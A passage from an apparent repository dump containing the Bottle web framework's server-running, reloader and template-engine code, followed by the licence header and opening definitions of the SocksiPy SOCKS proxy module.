AutoServer(ServerAdapter):\n    \"\"\" Untested. \"\"\"\n    adapters = [WaitressServer, PasteServer, TwistedServer, CherryPyServer,\n                CherootServer, WSGIRefServer]\n\n    def run(self, handler):\n        for sa in self.adapters:\n            try:\n                return sa(self.host, self.port, **self.options).run(handler)\n            except ImportError:\n                pass\n\n\nserver_names = {\n    'cgi': CGIServer,\n    'flup': FlupFCGIServer,\n    'wsgiref': WSGIRefServer,\n    'waitress': WaitressServer,\n    'cherrypy': CherryPyServer,\n    'cheroot': CherootServer,\n    'paste': PasteServer,\n    'fapws3': FapwsServer,\n    'tornado': TornadoServer,\n    'gae': AppEngineServer,\n    'twisted': TwistedServer,\n    'diesel': DieselServer,\n    'meinheld': MeinheldServer,\n    'gunicorn': GunicornServer,\n    'eventlet': EventletServer,\n    'gevent': GeventServer,\n    'bjoern': BjoernServer,\n    'aiohttp': AiohttpServer,\n    'uvloop': AiohttpUVLoopServer,\n    'auto': AutoServer,\n}\n\n###############################################################################\n# Application Control ##########################################################\n###############################################################################\n\n\ndef load(target, **namespace):\n    \"\"\" Import a module or fetch an object from a module.\n\n        * ``package.module`` returns `module` as a module object.\n        * ``pack.mod:name`` returns the module variable `name` from `pack.mod`.\n        * ``pack.mod:func()`` calls `pack.mod.func()` and returns the result.\n\n        The last form accepts not only function calls, but any type of\n        expression. Keyword arguments passed to this function are available as\n        local variables. Example: ``import_string('re:compile(x)', x='[a-z]')``\n    \"\"\"\n    module, target = target.split(\":\", 1) if ':' in target else (target, None)\n    if module not in sys.modules: __import__(module)\n    if not target: return sys.modules[module]\n    if target.isalnum(): return getattr(sys.modules[module], target)\n    package_name = module.split('.')[0]\n    namespace[package_name] = sys.modules[package_name]\n    return eval('%s.%s' % (module, target), namespace)\n\n\ndef load_app(target):\n    \"\"\" Load a bottle application from a module and make sure that the import\n        does not affect the current default application, but returns a separate\n        application object. See :func:`load` for the target parameter. \"\"\"\n    global NORUN\n    NORUN, nr_old = True, NORUN\n    tmp = default_app.push()  # Create a new \"default application\"\n    try:\n        rv = load(target)  # Import the target module\n        return rv if callable(rv) else tmp\n    finally:\n        default_app.remove(tmp)  # Remove the temporary added default application\n        NORUN = nr_old\n\n\n_debug = debug\n\n\ndef run(app=None,\n        server='wsgiref',\n        host='127.0.0.1',\n        port=8080,\n        interval=1,\n        reloader=False,\n        quiet=False,\n        plugins=None,\n        debug=None,\n        config=None, **kargs):\n    \"\"\" Start a server instance. This method blocks until the server terminates.\n\n        :param app: WSGI application or target string supported by\n               :func:`load_app`. (default: :func:`default_app`)\n        :param server: Server adapter to use. See :data:`server_names` keys\n               for valid names or pass a :class:`ServerAdapter` subclass.\n               (default: `wsgiref`)\n        :param host: Server address to bind to. Pass ``0.0.0.0`` to listens on\n               all interfaces including the external one. (default: 127.0.0.1)\n        :param port: Server port to bind to. Values below 1024 require root\n               privileges. (default: 8080)\n        :param reloader: Start auto-reloading server? (default: False)\n        :param interval: Auto-reloader interval in seconds (default: 1)\n        :param quiet: Suppress output to stdout and stderr? (default: False)\n        :param options: Options passed to the server adapter.\n     \"\"\"\n    if NORUN: return\n    if reloader and not os.environ.get('BOTTLE_CHILD'):\n        import subprocess\n        fd, lockfile = tempfile.mkstemp(prefix='bottle.', suffix='.lock')\n        environ = os.environ.copy()\n        environ['BOTTLE_CHILD'] = 'true'\n        environ['BOTTLE_LOCKFILE'] = lockfile\n        args = [sys.executable] + sys.argv\n        # If a package was loaded with `python -m`, then `sys.argv` needs to be\n        # restored to the original value, or imports might break. See #1336\n        if getattr(sys.modules.get('__main__'), '__package__', None):\n            args[1:1] = [\"-m\", sys.modules['__main__'].__package__]\n\n        try:\n            os.close(fd)  # We never write to this file\n            while os.path.exists(lockfile):\n                p = subprocess.Popen(args, env=environ)\n                while p.poll() is None:\n                    os.utime(lockfile, None)  # Tell child we are still alive\n                    time.sleep(interval)\n                if p.returncode == 3:  # Child wants to be restarted\n                    continue\n                sys.exit(p.returncode)\n        except KeyboardInterrupt:\n            pass\n        finally:\n            if os.path.exists(lockfile):\n                os.unlink(lockfile)\n        return\n\n    try:\n        if debug is not None: _debug(debug)\n        app = app or default_app()\n        if isinstance(app, basestring):\n            app = load_app(app)\n        if not callable(app):\n            raise ValueError(\"Application is not callable: %r\" % app)\n\n        for plugin in plugins or []:\n            if isinstance(plugin, basestring):\n                plugin = load(plugin)\n            app.install(plugin)\n\n        if config:\n            app.config.update(config)\n\n        if server in server_names:\n            server = server_names.get(server)\n        if isinstance(server, basestring):\n            server = load(server)\n        if isinstance(server, type):\n            server = server(host=host, port=port, **kargs)\n        if not isinstance(server, ServerAdapter):\n            raise ValueError(\"Unknown or unsupported server: %r\" % server)\n\n        server.quiet = server.quiet or quiet\n        if not server.quiet:\n            _stderr(\"Bottle v%s server starting up (using %s)...\" %\n                    (__version__, repr(server)))\n            if server.host.startswith(\"unix:\"):\n                _stderr(\"Listening on %s\" % server.host)\n            else:\n                _stderr(\"Listening on http://%s:%d/\" %\n                        (server.host, server.port))\n            _stderr(\"Hit Ctrl-C to quit.\\n\")\n\n        if reloader:\n            lockfile = os.environ.get('BOTTLE_LOCKFILE')\n            bgcheck = FileCheckerThread(lockfile, interval)\n            with bgcheck:\n                server.run(app)\n            if bgcheck.status == 'reload':\n                sys.exit(3)\n        else:\n            server.run(app)\n    except KeyboardInterrupt:\n        pass\n    except (SystemExit, MemoryError):\n        raise\n    except:\n        if not reloader: raise\n        if not getattr(server, 'quiet', quiet):\n            print_exc()\n        time.sleep(interval)\n        sys.exit(3)\n\n\nclass FileCheckerThread(threading.Thread):\n    \"\"\" Interrupt main-thread as soon as a changed module file is detected,\n        the lockfile gets deleted or gets too old. \"\"\"\n\n    def __init__(self, lockfile, interval):\n        threading.Thread.__init__(self)\n        self.daemon = True\n        self.lockfile, self.interval = lockfile, interval\n        #: Is one of 'reload', 'error' or 'exit'\n        self.status = None\n\n    def run(self):\n        exists = os.path.exists\n        mtime = lambda p: os.stat(p).st_mtime\n        files = dict()\n\n        for module in list(sys.modules.values()):\n            path = getattr(module, '__file__', '') or ''\n            if path[-4:] in ('.pyo', '.pyc'): path = path[:-1]\n            if path and exists(path): files[path] = mtime(path)\n\n        while not self.status:\n            if not exists(self.lockfile)\\\n            or mtime(self.lockfile) < time.time() - self.interval - 5:\n                self.status = 'error'\n                thread.interrupt_main()\n            for path, lmtime in list(files.items()):\n                if not exists(path) or mtime(path) > lmtime:\n                    self.status = 'reload'\n                    thread.interrupt_main()\n                    break\n            time.sleep(self.interval)\n\n    def __enter__(self):\n        self.start()\n\n    def __exit__(self, exc_type, *_):\n        if not self.status: self.status = 'exit'  # silent exit\n        self.join()\n        return exc_type is not None and issubclass(exc_type, KeyboardInterrupt)\n\n###############################################################################\n# Template Adapters ############################################################\n###############################################################################\n\n\nclass TemplateError(BottleException):\n    pass\n\n\nclass BaseTemplate(object):\n    \"\"\" Base class and minimal API for template adapters \"\"\"\n    extensions = ['tpl', 'html', 'thtml', 'stpl']\n    settings = {}  #used in prepare()\n    defaults = {}  #used in render()\n\n    def __init__(self,\n                 source=None,\n                 name=None,\n                 lookup=None,\n                 encoding='utf8', **settings):\n        \"\"\" Create a new template.\n        If the source parameter (str or buffer) is missing, the name argument\n        is used to guess a template filename. Subclasses can assume that\n        self.source and/or self.filename are set. Both are strings.\n        The lookup, encoding and settings parameters are stored as instance\n        variables.\n        The lookup parameter stores a list containing directory paths.\n        The encoding parameter should be used to decode byte strings or files.\n        The settings parameter contains a dict for engine-specific settings.\n        \"\"\"\n        self.name = name\n        self.source = source.read() if hasattr(source, 'read') else source\n        self.filename = source.filename if hasattr(source, 'filename') else None\n        self.lookup = [os.path.abspath(x) for x in lookup] if lookup else []\n        self.encoding = encoding\n        self.settings = self.settings.copy()  # Copy from class variable\n        self.settings.update(settings)  # Apply\n        if not self.source and self.name:\n            self.filename = self.search(self.name, self.lookup)\n            if not self.filename:\n                raise TemplateError('Template %s not found.' % repr(name))\n        if not self.source and not self.filename:\n            raise TemplateError('No template specified.')\n        self.prepare(**self.settings)\n\n    @classmethod\n    def search(cls, name, lookup=None):\n        \"\"\" Search name in all directories specified in lookup.\n        First without, then with common extensions. Return first hit. \"\"\"\n        if not lookup:\n            raise depr(0, 12, \"Empty template lookup path.\", \"Configure a template lookup path.\")\n\n        if os.path.isabs(name):\n            raise depr(0, 12, \"Use of absolute path for template name.\",\n                       \"Refer to templates with names or paths relative to the lookup path.\")\n\n        for spath in lookup:\n            spath = os.path.abspath(spath) + os.sep\n            fname = os.path.abspath(os.path.join(spath, name))\n            if not fname.startswith(spath): continue\n            if os.path.isfile(fname): return fname\n            for ext in cls.extensions:\n                if os.path.isfile('%s.%s' % (fname, ext)):\n                    return '%s.%s' % (fname, ext)\n\n    @classmethod\n    def global_config(cls, key, *args):\n        \"\"\" This reads or sets the global settings stored in class.settings. \"\"\"\n        if args:\n            cls.settings = cls.settings.copy()  # Make settings local to class\n            cls.settings[key] = args[0]\n        else:\n            return cls.settings[key]\n\n    def prepare(self, **options):\n        \"\"\" Run preparations (parsing, caching, ...).\n        It should be possible to call this again to refresh a template or to\n        update settings.\n        \"\"\"\n        raise NotImplementedError\n\n    def render(self, *args, **kwargs):\n        \"\"\" Render the template with the specified local variables and return\n        a single byte or unicode string. If it is a byte string, the encoding\n        must match self.encoding. This method must be thread-safe!\n        Local variables may be provided in dictionaries (args)\n        or directly, as keywords (kwargs).\n        \"\"\"\n        raise NotImplementedError\n\n\nclass MakoTemplate(BaseTemplate):\n    def prepare(self, **options):\n        from mako.template import Template\n        from mako.lookup import TemplateLookup\n        options.update({'input_encoding': self.encoding})\n        options.setdefault('format_exceptions', bool(DEBUG))\n        lookup = TemplateLookup(directories=self.lookup, **options)\n        if self.source:\n            self.tpl = Template(self.source, lookup=lookup, **options)\n        else:\n            self.tpl = Template(uri=self.name,\n                                filename=self.filename,\n                                lookup=lookup, **options)\n\n    def render(self, *args, **kwargs):\n        for dictarg in args:\n            kwargs.update(dictarg)\n        _defaults = self.defaults.copy()\n        _defaults.update(kwargs)\n        return self.tpl.render(**_defaults)\n\n\nclass CheetahTemplate(BaseTemplate):\n    def prepare(self, **options):\n        from Cheetah.Template import Template\n        self.context = threading.local()\n        self.context.vars = {}\n        options['searchList'] = [self.context.vars]\n        if self.source:\n            self.tpl = Template(source=self.source, **options)\n        else:\n            self.tpl = Template(file=self.filename, **options)\n\n    def render(self, *args, **kwargs):\n        for dictarg in args:\n            kwargs.update(dictarg)\n        self.context.vars.update(self.defaults)\n        self.context.vars.update(kwargs)\n        out = str(self.tpl)\n        self.context.vars.clear()\n        return out\n\n\nclass Jinja2Template(BaseTemplate):\n    def prepare(self, filters=None, tests=None, globals={}, **kwargs):\n        from jinja2 import Environment, FunctionLoader\n        self.env = Environment(loader=FunctionLoader(self.loader), **kwargs)\n        if filters: self.env.filters.update(filters)\n        if tests: self.env.tests.update(tests)\n        if globals: self.env.globals.update(globals)\n        if self.source:\n            self.tpl = self.env.from_string(self.source)\n        else:\n            self.tpl = self.env.get_template(self.name)\n\n    def render(self, *args, **kwargs):\n        for dictarg in args:\n            kwargs.update(dictarg)\n        _defaults = self.defaults.copy()\n        _defaults.update(kwargs)\n        return self.tpl.render(**_defaults)\n\n    def loader(self, name):\n        if name == self.filename:\n            fname = name\n        else:\n            fname = self.search(name, self.lookup)\n        if not fname: return\n        with open(fname, \"rb\") as f:\n            return (f.read().decode(self.encoding), fname, lambda: False)\n\n\nclass SimpleTemplate(BaseTemplate):\n    def prepare(self,\n                escape_func=html_escape,\n                noescape=False,\n                syntax=None, **ka):\n        self.cache = {}\n        enc = self.encoding\n        self._str = lambda x: touni(x, enc)\n        self._escape = lambda x: escape_func(touni(x, enc))\n        self.syntax = syntax\n        if noescape:\n            self._str, self._escape = self._escape, self._str\n\n    @cached_property\n    def co(self):\n        return compile(self.code, self.filename or '<string>', 'exec')\n\n    @cached_property\n    def code(self):\n        source = self.source\n        if not source:\n            with open(self.filename, 'rb') as f:\n                source = f.read()\n        try:\n            source, encoding = touni(source), 'utf8'\n        except UnicodeError:\n            raise depr(0, 11, 'Unsupported template encodings.', 'Use utf-8 for templates.')\n        parser = StplParser(source, encoding=encoding, syntax=self.syntax)\n        code = parser.translate()\n        self.encoding = parser.encoding\n        return code\n\n    def _rebase(self, _env, _name=None, **kwargs):\n        _env['_rebase'] = (_name, kwargs)\n\n    def _include(self, _env, _name=None, **kwargs):\n        env = _env.copy()\n        env.update(kwargs)\n        if _name not in self.cache:\n            self.cache[_name] = self.__class__(name=_name, lookup=self.lookup, syntax=self.syntax)\n        return self.cache[_name].execute(env['_stdout'], env)\n\n    def execute(self, _stdout, kwargs):\n        env = self.defaults.copy()\n        env.update(kwargs)\n        env.update({\n            '_stdout': _stdout,\n            '_printlist': _stdout.extend,\n            'include': functools.partial(self._include, env),\n            'rebase': functools.partial(self._rebase, env),\n            '_rebase': None,\n            '_str': self._str,\n            '_escape': self._escape,\n            'get': env.get,\n            'setdefault': env.setdefault,\n            'defined': env.__contains__\n        })\n        exec(self.co, env)\n        if env.get('_rebase'):\n            subtpl, rargs = env.pop('_rebase')\n            rargs['base'] = ''.join(_stdout)  #copy stdout\n            del _stdout[:]  # clear stdout\n            return self._include(env, subtpl, **rargs)\n        return env\n\n    def render(self, *args, **kwargs):\n        \"\"\" Render the template using keyword arguments as local variables. \"\"\"\n        env = {}\n        stdout = []\n        for dictarg in args:\n            env.update(dictarg)\n        env.update(kwargs)\n        self.execute(stdout, env)\n        return ''.join(stdout)\n\n\nclass StplSyntaxError(TemplateError):\n    pass\n\n\nclass StplParser(object):\n    \"\"\" Parser for stpl templates. \"\"\"\n    _re_cache = {}  #: Cache for compiled re patterns\n\n    # This huge pile of voodoo magic splits python code into 8 different tokens.\n    # We use the verbose (?x) regex mode to make this more manageable\n\n    _re_tok = r'''(\n        [urbURB]*\n        (?:  ''(?!')\n            |\"\"(?!\")\n            |'{6}\n            |\"{6}\n            |'(?:[^\\\\']|\\\\.)+?'\n            |\"(?:[^\\\\\"]|\\\\.)+?\"\n            |'{3}(?:[^\\\\]|\\\\.|\\n)+?'{3}\n            |\"{3}(?:[^\\\\]|\\\\.|\\n)+?\"{3}\n        )\n    )'''\n\n    _re_inl = _re_tok.replace(r'|\\n', '')  # We re-use this string pattern later\n\n    _re_tok += r'''\n        # 2: Comments (until end of line, but not the newline itself)\n        |(\\#.*)\n\n        # 3: Open and close (4) grouping tokens\n        |([\\[\\{\\(])\n        |([\\]\\}\\)])\n\n        # 5,6: Keywords that start or continue a python block (only start of line)\n        |^([\\ \\t]*(?:if|for|while|with|try|def|class)\\b)\n        |^([\\ \\t]*(?:elif|else|except|finally)\\b)\n\n        # 7: Our special 'end' keyword (but only if it stands alone)\n        |((?:^|;)[\\ \\t]*end[\\ \\t]*(?=(?:%(block_close)s[\\ \\t]*)?\\r?$|;|\\#))\n\n        # 8: A customizable end-of-code-block template token (only end of line)\n        |(%(block_close)s[\\ \\t]*(?=\\r?$))\n\n        # 9: And finally, a single newline. The 10th token is 'everything else'\n        |(\\r?\\n)\n    '''\n\n    # Match the start tokens of code areas in a template\n    _re_split = r'''(?m)^[ \\t]*(\\\\?)((%(line_start)s)|(%(block_start)s))'''\n    # Match inline statements (may contain python strings)\n    _re_inl = r'''%%(inline_start)s((?:%s|[^'\"\\n])*?)%%(inline_end)s''' % _re_inl\n\n    # add the flag in front of the regexp to avoid Deprecation warning (see Issue #949)\n    # verbose and dot-matches-newline mode\n    _re_tok = '(?mx)' + _re_tok\n    _re_inl = '(?mx)' + _re_inl\n\n\n    default_syntax = '<% %> % {{ }}'\n\n    def __init__(self, source, syntax=None, encoding='utf8'):\n        self.source, self.encoding = touni(source, encoding), encoding\n        self.set_syntax(syntax or self.default_syntax)\n        self.code_buffer, self.text_buffer = [], []\n        self.lineno, self.offset = 1, 0\n        self.indent, self.indent_mod = 0, 0\n        self.paren_depth = 0\n\n    def get_syntax(self):\n        \"\"\" Tokens as a space separated string (default: <% %> % {{ }}) \"\"\"\n        return self._syntax\n\n    def set_syntax(self, syntax):\n        self._syntax = syntax\n        self._tokens = syntax.split()\n        if syntax not in self._re_cache:\n            names = 'block_start block_close line_start inline_start inline_end'\n            etokens = map(re.escape, self._tokens)\n            pattern_vars = dict(zip(names.split(), etokens))\n            patterns = (self._re_split, self._re_tok, self._re_inl)\n            patterns = [re.compile(p % pattern_vars) for p in patterns]\n            self._re_cache[syntax] = patterns\n        self.re_split, self.re_tok, self.re_inl = self._re_cache[syntax]\n\n    syntax = property(get_syntax, set_syntax)\n\n    def translate(self):\n        if self.offset: raise RuntimeError('Parser is a one time instance.')\n        while True:\n            m = self.re_split.search(self.source, pos=self.offset)\n            if m:\n                text = self.source[self.offset:m.start()]\n                self.text_buffer.append(text)\n                self.offset = m.end()\n                if m.group(1):  # Escape syntax\n                    line, sep, _ = self.source[self.offset:].partition('\\n')\n                    self.text_buffer.append(self.source[m.start():m.start(1)] +\n                                            m.group(2) + line + sep)\n                    self.offset += len(line + sep)\n                    continue\n                self.flush_text()\n                self.offset += self.read_code(self.source[self.offset:],\n                                              multiline=bool(m.group(4)))\n            else:\n                break\n        self.text_buffer.append(self.source[self.offset:])\n        self.flush_text()\n        return ''.join(self.code_buffer)\n\n    def read_code(self, pysource, multiline):\n        code_line, comment = '', ''\n        offset = 0\n        while True:\n            m = self.re_tok.search(pysource, pos=offset)\n            if not m:\n                code_line += pysource[offset:]\n                offset = len(pysource)\n                self.write_code(code_line.strip(), comment)\n                break\n            code_line += pysource[offset:m.start()]\n            offset = m.end()\n            _str, _com, _po, _pc, _blk1, _blk2, _end, _cend, _nl = m.groups()\n            if self.paren_depth > 0 and (_blk1 or _blk2):  # a if b else c\n                code_line += _blk1 or _blk2\n                continue\n            if _str:  # Python string\n                code_line += _str\n            elif _com:  # Python comment (up to EOL)\n                comment = _com\n                if multiline and _com.strip().endswith(self._tokens[1]):\n                    multiline = False  # Allow end-of-block in comments\n            elif _po:  # open parenthesis\n                self.paren_depth += 1\n                code_line += _po\n            elif _pc:  # close parenthesis\n                if self.paren_depth > 0:\n                    # we could check for matching parentheses here, but it's\n                    # easier to leave that to python - just check counts\n                    self.paren_depth -= 1\n                code_line += _pc\n            elif _blk1:  # Start-block keyword (if/for/while/def/try/...)\n                code_line = _blk1\n                self.indent += 1\n                self.indent_mod -= 1\n            elif _blk2:  # Continue-block keyword (else/elif/except/...)\n                code_line = _blk2\n                self.indent_mod -= 1\n            elif _cend:  # The end-code-block template token (usually '%>')\n                if multiline: multiline = False\n                else: code_line += _cend\n            elif _end:\n                self.indent -= 1\n                self.indent_mod += 1\n            else:  # \\n\n                self.write_code(code_line.strip(), comment)\n                self.lineno += 1\n                code_line, comment, self.indent_mod = '', '', 0\n                if not multiline:\n                    break\n\n        return offset\n\n    def flush_text(self):\n        text = ''.join(self.text_buffer)\n        del self.text_buffer[:]\n        if not text: return\n        parts, pos, nl = [], 0, '\\\\\\n' + '  ' * self.indent\n        for m in self.re_inl.finditer(text):\n            prefix, pos = text[pos:m.start()], m.end()\n            if prefix:\n                parts.append(nl.join(map(repr, prefix.splitlines(True))))\n            if prefix.endswith('\\n'): parts[-1] += nl\n            parts.append(self.process_inline(m.group(1).strip()))\n        if pos < len(text):\n            prefix = text[pos:]\n            lines = prefix.splitlines(True)\n            if lines[-1].endswith('\\\\\\\\\\n'): lines[-1] = lines[-1][:-3]\n            elif lines[-1].endswith('\\\\\\\\\\r\\n'): lines[-1] = lines[-1][:-4]\n            parts.append(nl.join(map(repr, lines)))\n        code = '_printlist((%s,))' % ', '.join(parts)\n        self.lineno += code.count('\\n') + 1\n        self.write_code(code)\n\n    @staticmethod\n    def process_inline(chunk):\n        if chunk[0] == '!': return '_str(%s)' % chunk[1:]\n        return '_escape(%s)' % chunk\n\n    def write_code(self, line, comment=''):\n        code = '  ' * (self.indent + self.indent_mod)\n        code += line.lstrip() + comment + '\\n'\n        self.code_buffer.append(code)\n\n\ndef template(*args, **kwargs):\n    \"\"\"\n    Get a rendered template as a string iterator.\n    You can use a name, a filename or a template string as first parameter.\n    Template rendering arguments can be passed as dictionaries\n    or directly (as keyword arguments).\n    \"\"\"\n    tpl = args[0] if args else None\n    for dictarg in args[1:]:\n        kwargs.update(dictarg)\n    adapter = kwargs.pop('template_adapter', SimpleTemplate)\n    lookup = kwargs.pop('template_lookup', TEMPLATE_PATH)\n    tplid = (id(lookup), tpl)\n    if tplid not in TEMPLATES or DEBUG:\n        settings = kwargs.pop('template_settings', {})\n        if isinstance(tpl, adapter):\n            TEMPLATES[tplid] = tpl\n            if settings: TEMPLATES[tplid].prepare(**settings)\n        elif \"\\n\" in tpl or \"{\" in tpl or \"%\" in tpl or '$' in tpl:\n            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)\n        else:\n            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)\n    if not TEMPLATES[tplid]:\n        abort(500, 'Template (%s) not found' % tpl)\n    return TEMPLATES[tplid].render(kwargs)\n\n\nmako_template = functools.partial(template, template_adapter=MakoTemplate)\ncheetah_template = functools.partial(template,\n                                     template_adapter=CheetahTemplate)\njinja2_template = functools.partial(template, template_adapter=Jinja2Template)\n\n\ndef view(tpl_name, **defaults):\n    \"\"\" Decorator: renders a template for a handler.\n        The handler can control its behavior like that:\n\n          - return a dict of template vars to fill out the template\n          - return something other than a dict and the view decorator will not\n            process the template, but return the handler result as is.\n            This includes returning a HTTPResponse(dict) to get,\n            for instance, JSON with autojson or other castfilters.\n    \"\"\"\n\n    def decorator(func):\n\n        @functools.wraps(func)\n        def wrapper(*args, **kwargs):\n            result = func(*args, **kwargs)\n            if isinstance(result, (dict, DictMixin)):\n                tplvars = defaults.copy()\n                tplvars.update(result)\n                return template(tpl_name, **tplvars)\n            elif result is None:\n                return template(tpl_name, **defaults)\n            return result\n\n        return wrapper\n\n    return decorator\n\n\nmako_view = functools.partial(view, template_adapter=MakoTemplate)\ncheetah_view = functools.partial(view, template_adapter=CheetahTemplate)\njinja2_view = functools.partial(view, template_adapter=Jinja2Template)\n\n###############################################################################\n# Constants and Globals ########################################################\n###############################################################################\n\nTEMPLATE_PATH = ['./', './views/']\nTEMPLATES = {}\nDEBUG = False\nNORUN = False  # If set, run() does nothing. Used by load_app()\n\n#: A dict to map HTTP status codes (e.g. 404) to phrases (e.g. 'Not Found')\nHTTP_CODES = httplib.responses.copy()\nHTTP_CODES[418] = \"I'm a teapot\"  # RFC 2324\nHTTP_CODES[428] = \"Precondition Required\"\nHTTP_CODES[429] = \"Too Many Requests\"\nHTTP_CODES[431] = \"Request Header Fields Too Large\"\nHTTP_CODES[451] = \"Unavailable For Legal Reasons\" # RFC 7725\nHTTP_CODES[511] = \"Network Authentication Required\"\n_HTTP_STATUS_LINES = dict((k, '%d %s' % (k, v))\n                          for (k, v) in HTTP_CODES.items())\n\n#: The default template used for error pages. Override with @error()\nERROR_PAGE_TEMPLATE = \"\"\"\n%%try:\n    %%from %s import DEBUG, request\n    <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n    <html>\n        <head>\n            <title>Error: {{e.status}}</title>\n            <style type=\"text/css\">\n              html {background-color: #eee; font-family: sans-serif;}\n              body {background-color: #fff; border: 1px solid #ddd;\n                    padding: 15px; margin: 15px;}\n              pre {background-color: #eee; border: 1px solid #ddd; padding: 5px;}\n            </style>\n        </head>\n        <body>\n            <h1>Error: {{e.status}}</h1>\n            <p>Sorry, the requested URL <tt>{{repr(request.url)}}</tt>\n               caused an error:</p>\n            <pre>{{e.body}}</pre>\n            %%if DEBUG and e.exception:\n              <h2>Exception:</h2>\n              %%try:\n                %%exc = repr(e.exception)\n              %%except:\n                %%exc = '<unprintable %%s object>' %% type(e.exception).__name__\n              %%end\n              <pre>{{exc}}</pre>\n            %%end\n            %%if DEBUG and e.traceback:\n              <h2>Traceback:</h2>\n              <pre>{{e.traceback}}</pre>\n            %%end\n        </body>\n    </html>\n%%except ImportError:\n    <b>ImportError:</b> Could not generate the error page. Please add bottle to\n    the import path.\n%%end\n\"\"\" % __name__\n\n#: A thread-safe instance of :class:`LocalRequest`. If accessed from within a\n#: request callback, this instance always refers to the *current* request\n#: (even on a multi-threaded server).\nrequest = LocalRequest()\n\n#: A thread-safe instance of :class:`LocalResponse`. It is used to change the\n#: HTTP response for the *current* request.\nresponse = LocalResponse()\n\n#: A thread-safe namespace. Not used by Bottle.\nlocal = threading.local()\n\n# Initialize app stack (create first empty Bottle app now deferred until needed)\n# BC: 0.6.4 and needed for run()\napps = app = default_app = AppStack()\n\n#: A virtual package that redirects import statements.\n#: Example: ``import bottle.ext.sqlite`` actually imports `bottle_sqlite`.\next = _ImportRedirect('bottle.ext' if __name__ == '__main__' else\n                      __name__ + \".ext\", 'bottle_%s').module\n\n\ndef _main(argv):  # pragma: no coverage\n    args, parser = _cli_parse(argv)\n\n    def _cli_error(cli_msg):\n        parser.print_help()\n        _stderr('\\nError: %s\\n' % cli_msg)\n        sys.exit(1)\n\n    if args.version:\n        print('Bottle %s' % __version__)\n        sys.exit(0)\n    if not args.app:\n        _cli_error(\"No application entry point specified.\")\n\n    sys.path.insert(0, '.')\n    sys.modules.setdefault('bottle', sys.modules['__main__'])\n\n    host, port = (args.bind or 'localhost'), 8080\n    if ':' in host and host.rfind(']') < host.rfind(':'):\n        host, port = host.rsplit(':', 1)\n    host = host.strip('[]')\n\n    config = ConfigDict()\n\n    for cfile in args.conf or []:\n        try:\n            if cfile.endswith('.json'):\n                with open(cfile, 'rb') as fp:\n                    config.load_dict(json_loads(fp.read()))\n            else:\n                config.load_config(cfile)\n        except configparser.Error as parse_error:\n            _cli_error(parse_error)\n        except IOError:\n            _cli_error(\"Unable to read config file %r\" % cfile)\n        except (UnicodeError, TypeError, ValueError) as error:\n            _cli_error(\"Unable to parse config file %r: %s\" % (cfile, error))\n\n    for cval in args.param or []:\n        if '=' in cval:\n            config.update((cval.split('=', 1),))\n        else:\n            config[cval] = True\n\n    run(args.app,\n        host=host,\n        port=int(port),\n        server=args.server,\n        reloader=args.reload,\n        plugins=args.plugin,\n        debug=args.debug,\n        config=config)\n\n\nif __name__ == '__main__':  # pragma: no coverage\n    _main(sys.argv)\n", "thirdparty/bottle/__init__.py": "pass\n", "thirdparty/socks/socks.py": "#!/usr/bin/env python\n\n\"\"\"SocksiPy - Python SOCKS module.\nVersion 1.00\n\nCopyright 2006 Dan-Haim. All rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n1. Redistributions of source code must retain the above copyright notice, this\n   list of conditions and the following disclaimer.\n2. Redistributions in binary form must reproduce the above copyright notice,\n   this list of conditions and the following disclaimer in the documentation\n   and/or other materials provided with the distribution.\n3. Neither the name of Dan Haim nor the names of his contributors may be used\n   to endorse or promote products derived from this software without specific\n   prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY DAN HAIM \"AS IS\" AND ANY EXPRESS OR IMPLIED\nWARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO\nEVENT SHALL DAN HAIM OR HIS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\nINCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA\nOR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\nLIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT\nOF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMANGE.\n\n\nThis module provides a standard socket-like interface for Python\nfor tunneling connections through SOCKS proxies.\n\n\"\"\"\n\n\"\"\"\nMinor modifications made by Miroslav Stampar (https://sqlmap.org/)\nfor patching DNS-leakage occuring in socket.create_connection()\n\nMinor modifications made by Christopher Gilbert (http://motomastyle.com/)\nfor use in PyLoris (http://pyloris.sourceforge.net/)\n\nMinor modifications made by Mario Vilas (http://breakingcode.wordpress.com/)\nmainly to merge bug fixes found in Sourceforge\n\n\"\"\"\n\nimport socket\nimport struct\n\nPROXY_TYPE_SOCKS4 = 1\nPROXY_TYPE_SOCKS5 = 2\nPROXY_TYPE_HTTP = 3\n\n_defaultproxy = None\nsocket._orig_socket = _orgsocket = _orig_socket = socket.socket\n_orgcreateconnection = socket.create_connection\n\nclass ProxyError(Exception): pass\nclass GeneralProxyError(ProxyError): pass\nclass Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass\n\n_generalerrors = (\"success\",\n    \"invalid data\",\n    \"not connected\",\n    \"not available\",\n    \"bad proxy type\",\n    \"bad input\")\n\n_socks5errors = (\"succeeded\",\n    \"general SOCKS server failure\",\n    \"connection not allowed by ruleset\",\n    \"Network unreachable\",\n    \"Host unreachable\",\n    \"Connection refused\",\n    \"TTL expired\",\n    \"Command not supported\",\n    \"Address type not supported\",\n    \"Unknown error\")\n\n_socks5autherrors = (\"succeeded\",\n    \"authentication is required\",\n    \"all offered authentication methods were rejected\",\n    \"unknown username or invalid password\",\n    \"unknown error\")\n\n_socks4errors = (\"request granted\",\n    \"request rejected or failed\",\n    \"request rejected because SOCKS server cannot connect to identd on the client\",\n    \"request rejected because the client program and identd report different user-ids\",\n    \"unknown error\")\n\ndef setdefaultproxy(proxytype=None, addr=None, port=None, rdns=True, 